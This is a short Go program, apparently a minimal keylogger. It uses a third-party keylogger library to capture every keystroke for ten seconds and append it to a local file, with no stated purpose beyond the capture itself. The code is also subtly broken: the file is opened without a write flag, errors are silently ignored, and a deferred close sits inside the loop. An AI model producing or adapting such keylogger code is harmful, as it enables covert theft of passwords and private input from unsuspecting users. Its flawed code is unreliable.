package main

import (
	"github.com/kindlyfire/go-keylogger"
	"os"
	"time"
)

const (
	delayKeyfetchMS = 10
)

func main(){
	kl := keylogger.NewKeylogger()
	file, _ := os.OpenFile("keystrokes.txt", os.O_APPEND | os.O_CREATE, 0666)
	startTime := time.Now()
	for {

		key := kl.GetKey()

		if !key.Empty {

			defer file.Close()
			_, _ = file.WriteString(string(key.Rune))
		}
		if time.Since(startTime) > 10*time.Second{
			break
		}

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}